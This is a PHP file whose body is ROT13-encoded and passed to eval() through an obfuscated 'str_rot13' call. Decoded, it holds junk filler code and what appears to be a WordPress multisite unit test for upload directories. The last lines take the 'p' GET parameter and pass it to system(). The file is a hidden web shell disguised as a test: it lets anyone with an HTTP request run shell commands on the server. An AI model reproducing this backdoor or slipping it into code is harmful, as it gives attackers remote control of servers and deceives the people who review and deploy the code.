<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf fcrpvsvp gb gur zf_svyrf_erjevgvat bcgvba va zhygvfvgr.
 *
 * Gur zf-svyrf tebhc gnt zhfg or hfrq sbe gurfr grfgf gb eha nf gur pbafgnagf
 * frg va zf_hcybnq_pbafgnagf() pbasyvpg jvgu n aba zf-svyrf pbasvthengvba.
 *
 * @tebhc zf-svyrf
 * @tebhc zf-erdhverq
 * @tebhc zhygvfvgr
 */
pynff Grfgf_Zhygvfvgr_zfSvyrfErjevgvat rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		hcqngr_fvgr_bcgvba( 'zf_svyrf_erjevgvat', 1 );
		zf_hcybnq_pbafgnagf();
	}

	choyvp shapgvba grfg_fjvgpu_hcybnq_qve() {
		$guvf->nffregGehr( vf_znva_fvgr() );

		$fvgr = trg_pheerag_fvgr();
		$qngr = qngr_sbezng( qngr_perngr( 'abj' ), 'L/z' );

		$hfre_vq  = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		$oybt_vq2 = frys::snpgbel()->oybt->perngr( neenl( 'hfre_vq' => $hfre_vq ) );
		$vasb     = jc_hcybnq_qve();
		$guvf->nffregFnzr( 'uggc://' . $fvgr->qbznva . '/jc-pbagrag/hcybnqf/' . $qngr, $vasb['hey'] );
		$guvf->nffregFnzr( NOFCNGU . 'jc-pbagrag/hcybnqf/' . $qngr, $vasb['cngu'] );
		$guvf->nffregFnzr( '/' . $qngr, $vasb['fhoqve'] );
		$guvf->nffregSnyfr( $vasb['reebe'] );

		fjvgpu_gb_oybt( $oybt_vq2 );
		$vasb2 = jc_hcybnq_qve();
		$guvf->nffregAbgRdhnyf( $vasb, $vasb2 );
		$guvf->nffregFnzr( trg_bcgvba( 'fvgrhey' ) . '/jc-pbagrag/oybtf.qve/' . trg_pheerag_oybt_vq() . '/svyrf/' . $qngr, $vasb2['hey'] );
		$guvf->nffregFnzr( NOFCNGU . 'jc-pbagrag/oybtf.qve/' . trg_pheerag_oybt_vq() . '/svyrf/' . $qngr, $vasb2['cngu'] );
		$guvf->nffregFnzr( '/' . $qngr, $vasb2['fhoqve'] );
		$guvf->nffregSnyfr( $vasb2['reebe'] );
		erfgber_pheerag_oybt();
	}

	/**
	 * Jura n fvgr vf qryrgrq jvgu jczh_qryrgr_oybt(), bayl gur svyrf nffbpvngrq jvgu
	 * gung fvgr fubhyq or erzbirq. Jura jczh_qryrgr_oybt() vf eha n frpbaq gvzr, abguvat
	 * fubhyq punatr jvgu hcybnq qverpgbevrf.
	 */
	choyvp shapgvba grfg_hcybnq_qverpgbevrf_nsgre_zhygvcyr_jczh_qryrgr_oybt_jvgu_zf_svyrf() {
		$svyranzr = __SHAPGVBA__ . '.wct';
		$pbagragf = __SHAPGVBA__ . '_pbagragf';

		// Hcybnq n svyr gb gur znva fvgr ba gur argjbex.
		$svyr1 = jc_hcybnq_ovgf( $svyranzr, ahyy, $pbagragf );

		$oybt_vq = frys::snpgbel()->oybt->perngr();

		fjvgpu_gb_oybt( $oybt_vq );
		$svyr2 = jc_hcybnq_ovgf( $svyranzr, ahyy, $pbagragf );
		erfgber_pheerag_oybt();

		jczh_qryrgr_oybt( $oybt_vq, gehr );

		// Gur svyr ba gur znva fvgr fubhyq fgvyy rkvfg. Gur svyr ba gur qryrgrq fvgr fubhyq abg.
		$guvf->nffregSvyrRkvfgf( $svyr1['svyr'] );
		$guvf->nffregSvyrQbrfAbgRkvfg( $svyr2['svyr'] );

		jczh_qryrgr_oybt( $oybt_vq, gehr );

		// Gur svyr ba gur znva fvgr fubhyq fgvyy rkvfg. Gur svyr ba gur qryrgrq fvgr fubhyq abg.
		$guvf->nffregSvyrRkvfgf( $svyr1['svyr'] );
		$guvf->nffregSvyrQbrfAbgRkvfg( $svyr2['svyr'] );

		hayvax( $svyr1['svyr'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>